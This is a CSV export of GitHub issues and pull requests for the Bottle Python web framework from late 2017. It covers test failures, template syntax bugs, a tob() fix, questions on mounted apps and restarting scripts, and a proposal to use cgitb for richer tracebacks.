ID,Title,Created At,Closed At,Issues,Errors,Messages,Body
1025,Tests failing on Python 2.7,2017-12-23T14:51:27Z,,,AssertionError,"AssertionError: AttributeError: 'NoneType' object has no attribute 'split'","On a fresh clone of the repo, tests are failing under Python 2.7 (2.7.12 on Linux):
```
======================================================================
ERROR: test_simple (test.test_server.TestServerAdapter_auto)
Test a simple static page with this server adapter.
----------------------------------------------------------------------
Traceback (most recent call last):
  File ""/home/vinay/projects/bottle/test/test_server.py"", line 86, in tearDown
    raise AssertionError(line.strip().decode('utf8'))
AssertionError: AttributeError: 'NoneType' object has no attribute 'split'

======================================================================
ERROR: test_simple (test.test_server.TestServerAdapter_wsgiref)
Test a simple static page with this server adapter.
----------------------------------------------------------------------
Traceback (most recent call last):
  File ""/home/vinay/projects/bottle/test/test_server.py"", line 86, in tearDown
    raise AssertionError(line.strip().decode('utf8'))
AssertionError: AttributeError: 'NoneType' object has no attribute 'split'

----------------------------------------------------------------------
Ran 336 tests in 5.320s

FAILED (errors=2)
```
These fail quite often but sometimes just the one error occurs (the second one) and occasionally, no failure occurs. On Python 3.5, no failures occurred for multiple runs. Tests were run by simply running `testall.py` from within the `test` subdirectory."
1024,Added bottle-oauthlib project reference,2017-12-19T08:46:19Z,,,,,"Let me know if you think it is at the right place.
Thank you."
1023,Pathological SimpleTemplate Examples,2017-12-17T17:41:39Z,,,,,"Truth be told, I do not expect these to be fixed, but it is worth noting that there are some pathological SimpleTemplate lines.

Consider:

```python
bottle.template(""{{! {'a','b'} }}"") # works
bottle.template(""{{! {'a','b'}}}"") # Fails
```

Also, comments inline (done in an odd way). For example:

```
bottle.template(""Hide me: {{# Comment}}. Was it hidden"")
```
Will not work. Of course, this is not a good use of the templates, but in theory, it should not be shown. (should do `% #comment`)

I just think these are worth noting. Not necessarily worth trying to fix or even put in public-facing documentation"
1022,SimpleTemplateEngine block start and end cannot redefine,2017-12-15T22:07:39Z,,,,,"I am using a stripped out version of SImpleTemplateEngine for a project and ran into this issue. I thought maybe I introduced it in my changes, but it seems to exists in Bottle directly too.

You can redefine the SimpleTemplateEngine syntax and modify the `line_start`, the `inline_start` and the `inline_end`. However, for certain changes (though not *all*) changes to `block_start` and `block_end`, it fails.

Consider the following. In this, I change one type of syntax at a time. I also `reload` to make sure there isn't a cacheing issue.

```python
from imp import reload
import bottle

################
# Use reload to remove cache issues
reload(bottle)

default_txt = """"""\
<%
    A = 'hi'
%>
% B = 'bye'
{{A}} {{B}}
""""""
out = bottle.template(default_txt)
assert out.strip() == 'hi bye'

################
# Use reload to remove cache issues
reload(bottle)
new_output = """"""\
<%
    A = 'hi'
%>
% B = 'bye'
[[A]] [[B]]
""""""
out = bottle.template(new_output,
    template_settings=dict(syntax='<% %> % [[ ]]')
)
assert out.strip() == 'hi bye'

################
# Use reload to remove cache issues
reload(bottle)
new_line = """"""\
<%
    A = 'hi'
%>
! B = 'bye'
{{A}} {{B}}
""""""
out = bottle.template(new_line,
    template_settings=dict(syntax='<% %> ! {{ }}')
)
assert out.strip() == 'hi bye'

################
# Use reload to remove cache issues
reload(bottle)
new_block = """"""\
[{
    A = 'hi'
}]
% B = 'bye'
{{A}} {{B}}
""""""
out = bottle.template(new_block,
    template_settings=dict(syntax='[{ }] % {{ }}')
)
assert out.strip() == 'hi bye'
```

I get the following error (with personal info stripped out):

    Traceback (most recent call last):
      File ""error_demo.py"", line 59, in <module>
        template_settings=dict(syntax='[{ }] % {{ }}')
      File ""[...]/python3.6/site-packages/bottle.py"", line 3619, in template
        return TEMPLATES[tplid].render(kwargs)
      File ""[...]/python3.6/site-packages/bottle.py"", line 3409, in render
        self.execute(stdout, env)
      File ""[...]/python3.6/site-packages/bottle.py"", line 3396, in execute
        eval(self.co, env)
      File ""[...]/python3.6/site-packages/bottle.py"", line 189, in __get__
        value = obj.__dict__[self.func.__name__] = self.func(obj)
      File ""[...]/python3.6/site-packages/bottle.py"", line 3354, in co
        return compile(self.code, self.filename or '<string>', 'exec')
      File ""<string>"", line 3
        }]
        ^
    SyntaxError: invalid syntax

I am using python 3.6.3 in a virtualenv with nothing but bottle. Though I get the same issue in 2.7 (without the `from imp import reload`) line."
1021,Error trying to use global variable from mounted app,2017-12-12T00:30:16Z,2017-12-20T19:10:16Z,,,,"I got a parent_app in a python file (parent.py) that I'm trying to mount in a child_app in another python file (child.py). The mount seems to work but, when I try to call a route from my parent_app trough the mount in my child_app, this route doesn't seems to be able to use global variable in my parent.py file.

The parent.py file:

    from bottle import route
    import bottle
    import subprocess as sp

    global extProc

    parent_app = bottle.Bottle()

    @parent_app.route('/start')
    def start_bazarr():
        global extProc
        extProc = sp.Popen(['python','child.py'])

    @parent_app.route('/stop')
    def stop_bazarr():
        sp.Popen.terminate(extProc)

    @parent_app.route('/restart')
    def restart_bazarr():
        stop_bazarr()
        start_bazarr()

    if __name__ == '__main__':
        start_bazarr()

The child.py file:

    from bottle import route, run
    import bottle
    from parent import parent_app

    child_app = bottle.Bottle()

    @child_app.route('/')
    def root():
        return u'Lorem Ipsum'

    if __name__ == '__main__':
        child_app.mount('/power', parent_app)
        child_app.run(host='127.0.0.1', port=8080)

The URL I'm trying to call:

`http://127.0.0.1:8080/power/restart`

The error I got:

Traceback (most recent call last):

    File ""C:\Python27\lib\site-packages\bottle.py"", line 862, in _handle
        return route.call(**args)
    File ""C:\Python27\lib\site-packages\bottle.py"", line 1740, in wrapper
        rv = callback(*a, **ka)
    File ""C:\Users\morpheus\Desktop\parent.py"", line 20, in restart_bazarr
        stop_bazarr()
    File ""C:\Users\morpheus\Desktop\parent.py"", line 16, in stop_bazarr
        sp.Popen.terminate(extProc)
    NameError: global name 'extProc' is not defined

What am I doing wrong?"
1020,replace traceback with cgitb for error handling,2017-12-10T21:55:27Z,,,,,"replaces the standard traceback messages with more verbose messages from cgitb, to make debugging easier."
1019,Subdomain support?,2017-12-10T06:34:02Z,,,,,"You might add a subdomain parsing like in Flask.
[Flask Doc](http://flask.pocoo.org/docs/0.12/api/?highlight=subdomain#url-route-registrations)"
1018,fix pass None to tob,2017-12-09T03:12:06Z,2017-12-09T12:20:16Z,,,,"I think the `tob` fuction has a bug on this [line](https://github.com/bottlepy/bottle/blob/master/bottle.py#L164)

```Python
def tob(s, enc='utf8'):
    if isinstance(s, unicode):
        return s.encode(enc)
    return bytes("""" if s is None else s)
```

If pass `None` to `tob`, it will execute `bytes("""")`. And there will be a `TypeError` that `string argument without an encoding`

I think you mean that `return b'' if s is None else bytes(s)`

"
1017,How to restart my python script running bottle?,2017-12-09T02:46:38Z,2017-12-09T12:07:50Z,,,,"I want to define a route that can be called to restart my python script.

Here's a sample script:
    from bottle import route, run, redirect
    import os

    @route('/')
    def root():
        return u'test'

    @route('/restart')
    def restart():
        print 'restart'
        os.execlp('python', 'python', __file__)
        redirect ('/')

    run(host='0.0.0.0', port=8080)

I've tried with `os.execlp` but the new instance never reply to request. I just can't access it at all.

Some help would be appreciated to solve this one. Thanks!"
1016,Replace traceback with cgitb to improve debugging?,2017-12-06T12:34:07Z,,,TypeError,"TypeError: unsupported operand type(s) for /: 'str' and 'int'","While I like bottle a lot, I've often had trouble debugging an application because the standard traceback does not provide much information in the stacktrace.

While t's possible to install a plugin (bottle_debugtoolbar) to help solve this problem, I've found it a bit bloated (it uses jinja templates, so it requires that module plus others) and buggy (I haven't always been able to get it to work in an existing app).

I recently came across [cgitb](https://docs.python.org/3/library/cgitb.html), a module in the standard library of all current Python versions.  It was originally designed to provide traceback information for cgi scripts, but can be used to debug any Python application.  

The big advantage of this module is that it automatically displays:

1. the value of each argument of each  function in the call stack, 
2. some of the lines of code around each function call, and
3. the local variables of each function in the call stack.  

This makes debugging **much** easier.  So in a simple bottle app like this:
```
import bottle
app = bottle.default_app()

def error(var):
    bar = 1
    return var/bar

@app.route('/hello')
def hello():
    return error('5')

app.run(host='localhost', port=8080, debug=True)
```
Rather than seeing this:

> Traceback (most recent call last):
  File ""/tmp/test_app/bottle.py"", line 1000, in _handle
    out = route.call(**args)
  File ""/tmp/test_app/bottle.py"", line 2001, in wrapper
    rv = callback(*a, **ka)
  File ""hello_app.py"", line 11, in hello
    return error('5')
  File ""hello_app.py"", line 7, in error
    return var/bar
TypeError: unsupported operand type(s) for /: 'str' and 'int'

You get this (the original has better indentiation):

> <type 'exceptions.TypeError'>
> Python 2.7.13: /usr/bin/python
> Wed Dec  6 06:15:13 2017
> 
> A problem occurred in a Python script.  Here is the sequence of
> function calls leading up to the error, in the order they occurred.
> 
>  /tmp/test_app/bottle.py in _handle(self=<bottle.Bottle object>, environ={'BROWSER': '/usr/bin/firefox', 'COLORTERM': 'truecolor', 'CONTENT_LENGTH': '', 'CONTENT_TYPE': 'text/plain', 'DBUS_SESSION_BUS_ADDRESS': 'unix:path=/run/user/1000/bus', 'DESKTOP_SESSION': 'lightdm-xsession', 'DISPLAY': ':0.0', 'EDITOR': '/usr/bin/vim', 'GATEWAY_INTERFACE': 'CGI/1.1', 'GDMSESSION': 'lightdm-xsession', ...})
>   998                     environ['bottle.route'] = route
>   999                     environ['route.url_args'] = args
>  1000                     out = route.call(**args)
>  1001                     break
>  1002                 except HTTPResponse as E:
> out = None
> route = <GET '/hello' <function hello>>
> route.call = <function hello>
> args = {}
> 
>  /tmp/test_app/bottle.py in wrapper(*a=(), **ka={})
>  1999         def wrapper(*a, **ka):
>  2000             try:
>  2001                 rv = callback(*a, **ka)
>  2002             except HTTPResponse as resp:
>  2003                 rv = resp
> rv undefined
> callback = <function hello>
> a = ()
> ka = {}
> 
>  /tmp/test_app/hello_app.py in hello()
>     9 @app.route('/hello')
>    10 def hello():
>    11     return error('5')
>    12 
>    13 app.run(host='localhost', port=8080, debug=True)
> global error = <function error>
> 
>  /tmp/test_app/hello_app.py in error(var='5')
>     5 def error(var):
>     6     bar = 1
>     7     return var/bar
>     8 
>     9 @app.route('/hello')
> var = '5'
> bar = 1
> <type 'exceptions.TypeError'>: unsupported operand type(s) for /: 'str' and 'int'
>     __class__ = <type 'exceptions.TypeError'>
>     __delattr__ = <method-wrapper '__delattr__' of exceptions.TypeError object>
>     __dict__ = {}
>     __doc__ = 'Inappropriate argument type.'
>     __format__ = <built-in method __format__ of exceptions.TypeError object>
>     __getattribute__ = <method-wrapper '__getattribute__' of exceptions.TypeError object>
>     __getitem__ = <method-wrapper '__getitem__' of exceptions.TypeError object>
>     __getslice__ = <method-wrapper '__getslice__' of exceptions.TypeError object>
>     __hash__ = <method-wrapper '__hash__' of exceptions.TypeError object>
>     __init__ = <method-wrapper '__init__' of exceptions.TypeError object>
>     __new__ = <built-in method __new__ of type object>
>     __reduce__ = <built-in method __reduce__ of exceptions.TypeError object>
>     __reduce_ex__ = <built-in method __reduce_ex__ of exceptions.TypeError object>
>     __repr__ = <method-wrapper '__repr__' of exceptions.TypeError object>
>     __setattr__ = <method-wrapper '__setattr__' of exceptions.TypeError object>
>     __setstate__ = <built-in method __setstate__ of exceptions.TypeError object>
>     __sizeof__ = <built-in method __sizeof__ of exceptions.TypeError object>
>     __str__ = <method-wrapper '__str__' of exceptions.TypeError object>
>     __subclasshook__ = <built-in method __subclasshook__ of type object>
>     __unicode__ = <built-in method __unicode__ of exceptions.TypeError object>
>     args = (""unsupported operand type(s) for /: 'str' and 'int'"",)
>     message = ""unsupported operand type(s) for /: 'str' and 'int'""
> 
> The above is a description of an error in a Python program.  Here is
> the original traceback:
> 
> Traceback (most recent call last):
>   File ""/tmp/test_app/bottle.py"", line 1000, in _handle
>     out = route.call(**args)
>   File ""/tmp/test_app/bottle.py"", line 2001, in wrapper
>     rv = callback(*a, **ka)
>   File ""hello_app.py"", line 11, in hello
>     return error('5')
>   File ""hello_app.py"", line 7, in error
>     return var/bar
> TypeError: unsupported operand type(s) for /: 'str' and 'int'

The required changes are minimal (two new lines of code, one deletion, and five changes).  I can submit a pull request if there's interest.
"
1015,Problem of timeout with Multi-threaded backend server,2017-11-30T12:37:37Z,,,,,"Hello,

Since long time I have a problem when I use Bottle with Multi-threaded server: randomly I have a long request answer or a timeout.
- The code is simple, just load some data from a database.
- I tried with Python 3.2 and now Python 3.6.2
- I tried Debian 7 and 9
- I use the last version of Bottle
- I tried cherrypy and now paste

If someone have an idea how to fix my problem, thank you :)
"
1014,A few comment cleanups,2017-11-29T14:17:18Z,2017-12-09T12:22:07Z,,,,"Several lines had misaligned `#` symbols in them, they were:
271, 618, 1147, 1965, 2069, 2790, 2926, 3183, 3578, 3768, and 4260."
1013,Add UnicodeFormsPlugin + tests,2017-11-29T00:51:25Z,,,,,"Fixes #774 .

What: Adds a built-in plugin, `UnicodeFormsPlugin`, which looks for `config['utf8.unicode_forms']`. By default, `utf8.unicode_forms` is `False`, which means `FormsDict` will be used. When it is set to `True`, `UnicodeFormsDict` is used which inherits from `FormsDict` and overrides `MultiDict` methods so that all methods use `_fix` when applicable. It still retains access to the raw values through a few methods.

Usage:
```
app = bottle.Bottle()
app.install(bottle.UnicodeFormsPlugin())

app.config['utf8.unicode_forms'] = True
# or
@app.post('/someroute', **{'utf8.unicode_forms' : True})
def myroute():
    pass
```

It is both skippable and configurable per-route.

Since #774 is a compatibility issue, I tried to make sure an easy migration was possible. People can start using this plugin now, it can be turned on by default at a later version, and then we can remove the plugin and change the default behaviour later."
1012,Insert omitted word in stpl.rst,2017-11-28T16:16:43Z,2017-12-09T12:23:02Z,,,,
